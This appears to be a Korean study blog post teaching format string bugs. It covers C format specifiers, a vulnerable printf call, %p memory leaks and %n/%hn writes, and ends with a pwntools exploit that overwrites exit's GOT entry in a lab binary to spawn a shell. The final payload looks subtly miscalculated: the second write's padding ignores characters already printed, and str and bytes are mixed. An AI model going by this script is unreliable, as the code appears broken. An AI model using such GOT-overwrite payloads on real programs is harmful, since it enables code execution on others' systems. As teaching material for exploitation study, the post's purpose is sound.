---
title: "[PWNABLE] FSB"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ FSB는 Format String Bug의 약자로 이름 그대로 형식 지정자의 잘못 사용으로 인해 발생하는 취약점이다.변수의 출력을 위해 아래와 같이 printf()를 많이 사용해왔을 것이다.printf(\"%d\",num1);이 방식대로 사용하는 것이 "
date: "2024-06-24"
translation_key: "tistory-b0994a81b2cb"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-FSB"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

FSB는 Format String Bug의 약자로 이름 그대로 형식 지정자의 잘못 사용으로 인해 발생하는 취약점이다.

변수의 출력을 위해 아래와 같이 printf()를 많이 사용해왔을 것이다.

```
printf("%d",num1);
```

이 방식대로 사용하는 것이 올바른 방법이다라는 것은 알고 있을 것인데,

그러면 취약한 코드의 경우에는 어떻게 사용하였기에 Bug가 발생하는 것일까?

#### 형식 지정자란?

이를 이해하기 위해서는 형식 지정자가 무엇인지 알아야 한다. 형식 지정자는 printf()나 scanf()와 같은 함수에서 가변 인자를 받아 처리하기 위한 데이터 포맷이다. 예를 들어, %d는 정수를 출력하는 형식 지정자이고, %s는 문자열을 출력하는 형식 지정자이다.

형식 지정자는 보통 출력할 변수의 데이터 타입을 명확하게 명시하기 위해 사용된다.

더보기

**서식 지정자**

**자료형**

**의미**

%c

char

문자

%s

char\*, char\[\]

문자열

%hd

short

부호를 포함한 2byte 크기의 정수 (10진수)

%d

int

부호를 포함한 int 타입 크기의 정수 (10진수)

%ld

long

부호를 포함한 long 타입 크기의 정수 (10진수)

%lld

long long

부호를 포함한 8byte 크기의 정수 (10진수)

%hi

short

부호를 포함한 2byte 크기의 정수 (10진수)

%i

int

부호를 포함한 int 타입 크기의 정수 (10진수)

%li

long

부호를 포함한 long 타입 크기의 정수 (10진수)

%lli

long long

부호를 포함한 8byte 크기의 정수 (10진수)

%hu

unsigned short

부호를 포함하지 않는 2byte 크기의 정수 (10진수)

%u

unsigned int

부호를 포함하지 않는 int 타입 크기의 정수 (10진수)

%lu

unsigned long

부호를 포함하지 않는 long 타입 크기의 정수 (10진수)

%llu

unsigned long long

부호를 포함하지 않는 8byte 크기의 정수 (10진수)

%ho

unsigned short

부호를 포함하지 않는 2byte 크기의 정수 (8진수)

%o

unsigned int

부호를 포함하지 않는 int 타입 크기의 정수 (8진수)

%lo

unsigned long

부호를 포함하지 않는 long 타입 크기의 정수 (8진수)

%llo

unsigned long long

부호를 포함하지 않는 8byte 크기의 정수 (8진수)

%hx

unsigned short

부호를 포함하지 않는 2byte 크기의 정수 (16진수, abcdef 를 소문자로 표기)

%x

unsigned int

부호를 포함하지 않는 int 타입 크기의 정수 (16진수, abcdef 를 소문자로 표기)

%lx

unsigned long

부호를 포함하지 않는 long 타입 크기의 정수 (16진수, abcdef 를 소문자로 표기)

%llx

unsigned long long

부호를 포함하지 않는 8byte 크기의 정수 (16진수, abcdef 를 소문자로 표기)

%hX

unsigned short

부호를 포함하지 않는 2byte 크기의 정수 (16진수, ABCDEF 를 대문자로 표기)

%X

unsigned int

부호를 포함하지 않는 int 타입 크기의 정수 (16진수, ABCDEF 를 대문자로 표기)

%lX

unsigned long

부호를 포함하지 않는 long 타입 크기의 정수 (16진수, ABCDEF 를 대문자로 표기)

%llX

unsigned long long

부호를 포함하지 않는 8byte 크기의 정수 (16진수, ABCDEF 를 대문자로 표기)

%f

float

소수점으로 표현한 4byte 크기의 실수 (10진수)

%lf

double

소수점으로 표현한 8byte 크기의 실수 (10진수)

%llf , %Lf

long double

소수점으로 표현한 long double 타입 크기의 실수 (10진수)

%e

float

지수 표기법으로 표현한 4byte 크기의 실수 (10진수, 소문자 e)

%le

double

지수 표기법으로 표현한 8byte 크기의 실수 (10진수, 소문자 e)

%Le

long double

지수 표기법으로 표현한 long double 타입 크기의 실수 (10진수, 소문자 e)

%E

float

지수 표기법으로 표현한 4byte 크기의 실수 (10진수, 대문자 E)

%lE

double

지수 표기법으로 표현한 8byte 크기의 실수 (10진수, 대문자 E)

%LE

long double

지수 표기법으로 표현한 long double 타입 크기의 실수 (10진수, 대문자 E)

%g

float

%f 와  %e 둘중에 짧은 길이로 표현되는 서식 지정자를 사용 (소문자 e)

%lg

double

%lf 와 %le 둘중에 짧은 길이로 표현되는 서식 지정자를 사용 (소문자 e)

%Lg

long double

%Lf 와 %Le 둘중에 짧은 길이요 표현되는 서식 지정자를 사용 (소문자 e)

%G

float

%f 와 %e 둘중에 짧은 길이로 표현되는 서식 지정자를 사용 (대문자 E)

%lG

double

%lf 와 %le 둘중에 짧은 길이로 표현되는 서식 지정자를 사용 (대문자 E)

%LG

long double

%Lf 와 %Le 둘중에 짧은 길이로 표현되는 서식 지정자를 사용 (대문자 E)

해당 표는 아래 링크에서 가져왔다

[https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90](https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90)

 [\[C언어\] 서식 지정자의 모든것 (서식문자)

서식 지정자 ? printf, scanf, sprintf, fprintf 등의 여러 API 에서 가변인자를 받아서 처리하기 위한 데이터 포맷이다. 가변인자를 처리하는 API 함수 내부에서 어떤 인자를 어떤식으로 처리할지 지정하

hackerpark.tistory.com](https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90)

* * *

#### 취약한 코드 예시

FSB가 발생하는 일반적인 예시는 다음과 같다.

```
char userInput[100];
scanf("%s", userInput);
printf(userInput);
```

위 코드에서는 printf()에 형식 지정자를 사용하지 않고, 사용자 입력을 그대로 전달하고 있다. 이런 경우, 사용자 입력에 형식 지정자가 포함되어 있으면, 예상치 못한 방식으로 메모리를 읽거나 쓰게 되어 버그가 발생할 수 있다.

* * *

#### 문제점과 공격 방식

취약한 printf 호출은 공격자가 메모리의 임의의 위치를 읽거나 쓰도록 악용될 수 있다. 예를 들어, 사용자가 userInput에 %x %x %x %x와 같은 입력을 제공하면, 프로그램의 메모리 내용을 출력하게 된다. 더 심각한 경우, %n 형식 지정자를 이용해 메모리에 특정 값을 쓰도록 조작할 수 있다.

간단한 예제를 가지고 살펴보도록 하겠다.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
    printf("Hello! ZZoMblE");
    system("/bin/sh");
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char buf[128];
    read(0,buf,128);
    printf(buf);
    exit(0);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

먼저 취약점을 찾아보면 vuln()에서 buffer를 출력할 때 형식 지정자를 사용하지 않고 하는 것을 확인할 수 있다.

취약점을 알았는데 이제 어떻게 Exploit을 해야하는지가 궁금할 것이다.

여기서 사용할 것은 '%p'라는 형식 지정자이다.

메모리에 있는 값을 주소값으로 출력해주는 것으로, 레지스터와 스택에 있는 값들을 확인할 수 있게 해준다.

![](/assets/images/tistory/tistory-b0994a81b2cb/001.png)

이제 출력된 값들이 무슨 값들인지 확인해보도록 하겠다.

취약한 함수에 breakpoint를 걸고나서 %p를 입력했다.

이제 취약한 함수가 호출되기 전과 호출로 인해 출력된 값들을 비교해보겠다.

![](/assets/images/tistory/tistory-b0994a81b2cb/002.png)

앞에서 우리는 함수 호출 규약에 대해 다루었었다.

[https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention](https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention)

 [\[PWNABLE\] Calling Convention

Stack Buffer OverFlow와 Return Address OverFlow를 진행하고 있는 지금 상황에서 크게 중요하지 않지만, 앞으로 포스팅을 진행하면서 rtl, rop, fsb 등과 같은 공격 기법들을 이해하기 위해서는 가장 기본이 되

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention)

인자들이 사용되는 순서는 rdi - rsi - rdx - rcx - r8 - r9 - stack 순으로 되기 때문에 이 부분을 확인해주는 과정이다.

![](/assets/images/tistory/tistory-b0994a81b2cb/003.png)

rdi에는 printf()의 첫 번째 인자인 변수의 값인 우리가 입력한 형식 지정자가 들어가 있다.

![](/assets/images/tistory/tistory-b0994a81b2cb/004.png)

이후 rsi, rdx, rcx, r8, r9를 모두 확인해보면 동일한 것을 확인할 수 있다.

그 뒤로는 stack의 값들이 아래와 출력이 되어있다.

![](/assets/images/tistory/tistory-b0994a81b2cb/005.png)

이와 같은 방법으로 fsb를 활용하여 memory leak이 수행이 가능하다.

leak하는 방법은 알았는데, 이제 어떻게 exploit를 해야할까?

이것에 대한 정답 역시 형식 지정자에 있다.

#### %n과 %hn 형식 지정자

FSB 공격에서 %n과 %hn 형식 지정자는 공격자가 메모리에 값을 쓰는 데 사용된다. %n은 작성된 문자의 수를 지정된 메모리 위치에 쓴다.

예를 들어, printf("hello%n", &var);는 "hello"의 길이인 5를 var에 쓴다. %hn은 동일한 역할을 하지만, 절반 크기만 쓴다.

메모리의 특정 위치에 원하는 값을 써서 반환 주소나 함수 포인터를 덮어쓰는 등의 작업을 수행할 수 있다.

공격을 %n, %hn으로 할 것인데, 앞에서 %p를 통하여 메모리를 확인하는 과정을 왜 거쳤을까? %n으로 메모리를 덮어쓰기 위해서는 메모리의 몇번째 offset에 덮어쓸 것인지에 대한 확인이 필요하다. Debugging을 통해 확인하는 방법도 있지만, 이와 같은 방법으로도 많이 확인한다.

%n

4byte

%hn

2byte

%hhn

1byte

우리가 확인할 offset은 사용자 입력 값이 버퍼의 어디에 위치하는지이다. 지금의 경우 스택의 최상단에 위치하고 있지만 변수들이 여러개가 사용된 경우 그렇지 않은 경우도 많기 때문이다.

offset을 확인했으니 이제 GOT Overwrite를 수행하겠다. 어떤 함수의 GOT를 덮어쓸 것인지는 어느정도 보일 것이다. 

취약한 printf() 다음에 위치한 exit(0)를 이용하여 gift()를 호출하면 된다.

![](/assets/images/tistory/tistory-b0994a81b2cb/006.png)

gift()의 주소는 0x4011b6이다. 4바이트에 해당하는데 %n을 이용하여 한번에 해도 되겠지만 개인적으로 2바이트씩 쪼개서 하는 방식을 선호하고 있다.

작성법은 다음과 같이 덮어쓸 값을 '%{num}c'형식으로 작성해준다. 이때 num에는 주소값의 2바이트를 때어내어 10진수로 바꾼 값이 들어간다.

```
%1234c%20$hn
```

아래는 최종 페이로드이다.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format((gift >> 16) & 0xffff )
payload += '%9$hn'
payload += '%{}c'.format(gift & 0xffff)
payload += '%10$hn'
payload += b'\x41'*3
payload += p64(exit_got+2)
payload += p64(exit_got)

p.send(payload)

p.interactive()
```

중간에 주소 패딩을 위해 b'\\x41'를 넣어주고, exit\_got도 2바이트씩 쪼개어 덮어주고 있다.

이때 실행은 python3이 아닌 python2로 해주어야 한다.

![](/assets/images/tistory/tistory-b0994a81b2cb/007.png)
